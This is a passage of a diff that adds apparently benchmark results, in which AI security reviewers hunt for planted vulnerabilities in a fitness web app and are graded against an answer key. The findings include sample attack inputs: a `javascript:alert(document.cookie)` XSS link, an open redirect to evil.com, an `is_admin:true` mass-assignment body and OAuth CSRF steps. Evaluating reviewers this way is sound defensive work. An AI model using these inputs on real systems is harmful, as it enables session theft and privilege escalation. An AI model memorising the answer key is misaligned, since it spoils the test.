+              "evidence": "Line 53 enables `rehype-raw`, which parses raw HTML in the markdown input into the AST. The custom `a` component (line 33) passes `href` through to the rendered `<a>` tag without sanitizing `javascript:` URIs. An attacker who can influence the `text` prop (e.g. via prompt injection into AI-generated content) can inject `<a href=\"javascript:alert(document.cookie)\">Click</a>` which executes on click."
+            }
+          ],
+          "seconds": 104.4,
+          "inputTokens": 11857,
+          "outputTokens": 4729,
+          "grade": {
+            "found": [
+              "V2",
+              "V3",
+              "V5",
+              "V7",
+              "V8"
+            ],
+            "missed": [
+              "V1",
+              "V4",
+              "V6"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 109,
+                  "category": "mass-assignment",
+                  "severity": "high",
+                  "title": "Mass assignment via .passthrough() spreads arbitrary fields into DB update",
+                  "evidence": "The settingsSchema uses `.passthrough()` (line 109), so any extra keys survive parsing. Then line 117 does `.set({ ...data, updated_at: new Date() })`, writing every field from the input—including attacker-supplied columns like `is_admin` or `role`—into the profiles row. An authenticated user can send `{\"sex\":\"male\",\"birth_year\":1990,\"height_cm\":180,\"timezone\":\"UTC\",\"day_cutoff_hour\":0,\"is_admin\":true}` to escalate privileges."
+                },
+                "planted": "V5"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "high",
+                  "title": "Open redirect via unvalidated `next` query parameter",
+                  "evidence": "Line 12 reads `next` from the query string and line 13 passes it directly to `new URL(next ?? \"/settings?whoop=env\", request.url)`. When `next` is an absolute URL like `https://evil.com`, the redirect goes to the attacker's site. An attacker sends a victim the link `/api/whoop/connect?next=https://evil.com/phish` and the victim is redirected after authentication, enabling phishing."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "deleteSubscription ignores userId, any user can delete others' subscriptions",
+                  "evidence": "The function accepts `userId` as a parameter (line 40) but the WHERE clause on line 46 only filters by `endpoint`, not `user_id`. An authenticated user who knows or can enumerate another user's push subscription endpoint can delete it by calling the DELETE action with that endpoint, silencing push notifications for the victim."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state CSRF check silently skipped when cookie is missing",
+                  "evidence": "Line 21: `if (!code || (expected && state !== expected))` — when the `whoop_oauth_state` cookie is absent (expired, blocked, or cleared), `expected` is undefined and the entire state comparison is skipped regardless of the `state` parameter value. An attacker can obtain a valid Whoop authorization code, then navigate the victim's browser to `/api/whoop/callback?code=<attacker_code>&state=x` to link the attacker's Whoop account to the victim's account, bypassing CSRF protection on the OAuth callback."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/components/ui/Markdown.tsx",
+                  "line": 53,
+                  "category": "xss",
+                  "severity": "medium",
+                  "title": "rehype-raw allows arbitrary HTML injection including javascript: URLs",
+                  "evidence": "Line 53 enables `rehype-raw`, which parses raw HTML in the markdown input into the AST. The custom `a` component (line 33) passes `href` through to the rendered `<a>` tag without sanitizing `javascript:` URIs. An attacker who can influence the `text` prop (e.g. via prompt injection into AI-generated content) can inject `<a href=\"javascript:alert(document.cookie)\">Click</a>` which executes on click."
+                },
+                "planted": "V7"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [],
+            "recall": 0.625,
+            "precision": 1
+          }
+        },
+        {
+          "rep": 3,
+          "ok": true,
+          "findings": [
+            {
+              "file": "src/app/api/whoop/connect/route.ts",
+              "line": 13,
+              "category": "open-redirect",
+              "severity": "medium",
+              "title": "Open redirect via unvalidated `next` query parameter",
+              "evidence": "Line 12-13: `const next = new URL(request.url).searchParams.get('next'); return NextResponse.redirect(new URL(next ?? '/settings?whoop=env', request.url));` An attacker can craft a link like `/api/whoop/connect?next=https://evil.com` and `new URL('https://evil.com', request.url)` resolves to the attacker's site, redirecting the authenticated user after login."
+            },
+            {
+              "file": "src/lib/data/pushSubscriptions.ts",
+              "line": 46,
+              "category": "authorization",
+              "severity": "high",
+              "title": "deleteSubscription ignores userId — any user can delete another user's push subscription",
+              "evidence": "Line 43-47: the function accepts `userId` but the WHERE clause only filters by `endpoint`: `.where(eq(push_subscriptions.endpoint, endpoint))`. An authenticated user can call DELETE /api/push/subscribe with any other user's endpoint URL and delete their subscription."
+            },
+            {
+              "file": "src/lib/actions/profile.ts",
+              "line": 109,
+              "category": "mass-assignment",
+              "severity": "high",
+              "title": "Mass assignment via .passthrough() allows overwriting arbitrary profile columns",
+              "evidence": "Line 109: `settingsSchema` uses `.passthrough()` so extra fields survive parsing. Line 117: `await db.update(profiles).set({ ...data, updated_at: new Date() })` spreads the full parsed object into the SET clause. An attacker can POST `{sex:'male', birth_year:2000, height_cm:180, timezone:'UTC', day_cutoff_hour:0, user_id:'other-id'}` to overwrite the `user_id` column (or any other column) on their own profile row."
+            },
+            {
+              "file": "src/app/api/whoop/callback/route.ts",
+              "line": 21,
+              "category": "csrf",
+              "severity": "medium",
+              "title": "OAuth state CSRF check is skipped when cookie is absent",
+              "evidence": "Line 21: `if (!code || (expected && state !== expected))` — if the `whoop_oauth_state` cookie is missing (expired, cleared, or stripped by the browser), the condition `expected && state !== expected` is false and any attacker-supplied `state` value is accepted. This allows an attacker to complete the OAuth callback on behalf of a victim by initiating the flow themselves and redirecting the callback."
+            },
+            {
+              "file": "src/lib/actions/meals.ts",
+              "line": 170,
+              "category": "authorization",
+              "severity": "medium",
+              "title": "repeatMeal copies another user's meal data via IDOR",
+              "evidence": "Line 169-174: the source meal is fetched with `.where(eq(meals.id, mealId))` without filtering by `meals.user_id`. Any authenticated user can supply another user's meal ID and the query returns that meal's name, place, macros, fat quality, and catalog item ID, which are then inserted under the attacker's account — leaking meal metadata."
+            },
+            {
+              "file": "src/components/ui/Markdown.tsx",
+              "line": 33,
+              "category": "xss",
+              "severity": "medium",
+              "title": "rehype-raw with unsanitized href allows javascript: URI XSS",
+              "evidence": "Line 53: `rehypePlugins={[rehypeRaw]}` enables raw HTML pass-through. Line 32-35: the custom `a` component renders `<a href={href}>` without filtering the protocol. Markdown input containing `[click](javascript:alert(document.cookie))` will render as a clickable link that executes JavaScript when clicked."
+            },
+            {
+              "file": "src/app/api/cron/maintenance/route.ts",
+              "line": 16,
+              "category": "authentication",
+              "severity": "medium",
+              "title": "Cron endpoint is unauthenticated when CRON_SECRET env var is unset",
+              "evidence": "Line 16: `if (cronSecret && auth !== ...)` — when `process.env.CRON_SECRET` is undefined/null, the `&&` short-circuits to false and the check is skipped entirely. Any external requester can trigger the full maintenance pipeline (expireStaleFacts, consolidateMemories, pruneEvents) without credentials."
+            }
+          ],
+          "seconds": 81.6,
+          "inputTokens": 11850,
+          "outputTokens": 3219,
+          "grade": {
+            "found": [
+              "V1",
+              "V2",
+              "V3",
+              "V4",
+              "V5",
+              "V8"
+            ],
+            "missed": [
+              "V6",
+              "V7"
+            ],
+            "matched": [
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/connect/route.ts",
+                  "line": 13,
+                  "category": "open-redirect",
+                  "severity": "medium",
+                  "title": "Open redirect via unvalidated `next` query parameter",
+                  "evidence": "Line 12-13: `const next = new URL(request.url).searchParams.get('next'); return NextResponse.redirect(new URL(next ?? '/settings?whoop=env', request.url));` An attacker can craft a link like `/api/whoop/connect?next=https://evil.com` and `new URL('https://evil.com', request.url)` resolves to the attacker's site, redirecting the authenticated user after login."
+                },
+                "planted": "V8"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/data/pushSubscriptions.ts",
+                  "line": 46,
+                  "category": "authorization",
+                  "severity": "high",
+                  "title": "deleteSubscription ignores userId — any user can delete another user's push subscription",
+                  "evidence": "Line 43-47: the function accepts `userId` but the WHERE clause only filters by `endpoint`: `.where(eq(push_subscriptions.endpoint, endpoint))`. An authenticated user can call DELETE /api/push/subscribe with any other user's endpoint URL and delete their subscription."
+                },
+                "planted": "V3"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/profile.ts",
+                  "line": 109,
+                  "category": "mass-assignment",
+                  "severity": "high",
+                  "title": "Mass assignment via .passthrough() allows overwriting arbitrary profile columns",
+                  "evidence": "Line 109: `settingsSchema` uses `.passthrough()` so extra fields survive parsing. Line 117: `await db.update(profiles).set({ ...data, updated_at: new Date() })` spreads the full parsed object into the SET clause. An attacker can POST `{sex:'male', birth_year:2000, height_cm:180, timezone:'UTC', day_cutoff_hour:0, user_id:'other-id'}` to overwrite the `user_id` column (or any other column) on their own profile row."
+                },
+                "planted": "V5"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/whoop/callback/route.ts",
+                  "line": 21,
+                  "category": "csrf",
+                  "severity": "medium",
+                  "title": "OAuth state CSRF check is skipped when cookie is absent",
+                  "evidence": "Line 21: `if (!code || (expected && state !== expected))` — if the `whoop_oauth_state` cookie is missing (expired, cleared, or stripped by the browser), the condition `expected && state !== expected` is false and any attacker-supplied `state` value is accepted. This allows an attacker to complete the OAuth callback on behalf of a victim by initiating the flow themselves and redirecting the callback."
+                },
+                "planted": "V2"
+              },
+              {
+                "finding": {
+                  "file": "src/lib/actions/meals.ts",
+                  "line": 170,
+                  "category": "authorization",
+                  "severity": "medium",
+                  "title": "repeatMeal copies another user's meal data via IDOR",
+                  "evidence": "Line 169-174: the source meal is fetched with `.where(eq(meals.id, mealId))` without filtering by `meals.user_id`. Any authenticated user can supply another user's meal ID and the query returns that meal's name, place, macros, fat quality, and catalog item ID, which are then inserted under the attacker's account — leaking meal metadata."
+                },
+                "planted": "V4"
+              },
+              {
+                "finding": {
+                  "file": "src/app/api/cron/maintenance/route.ts",
+                  "line": 16,
+                  "category": "authentication",
+                  "severity": "medium",
+                  "title": "Cron endpoint is unauthenticated when CRON_SECRET env var is unset",
+                  "evidence": "Line 16: `if (cronSecret && auth !== ...)` — when `process.env.CRON_SECRET` is undefined/null, the `&&` short-circuits to false and the check is skipped entirely. Any external requester can trigger the full maintenance pipeline (expireStaleFacts, consolidateMemories, pruneEvents) without credentials."
+                },
+                "planted": "V1"
+              }
+            ],
+            "duplicates": [],
+            "unmatched": [
+              {
+                "file": "src/components/ui/Markdown.tsx",
+                "line": 33,
+                "category": "xss",
+                "severity": "medium",
+                "title": "rehype-raw with unsanitized href allows javascript: URI XSS",
+                "evidence": "Line 53: `rehypePlugins={[rehypeRaw]}` enables raw HTML pass-through. Line 32-35: the custom `a` component renders `<a href={href}>` without filtering the protocol. Markdown input containing `[click](javascript:alert(document.cookie))` will render as a clickable link that executes JavaScript when clicked."
+              }
+            ],
+            "recall": 0.75,
+            "precision": 0.8571428571428571
+          }
+        }
+      ]
+    }
+  ]
+}
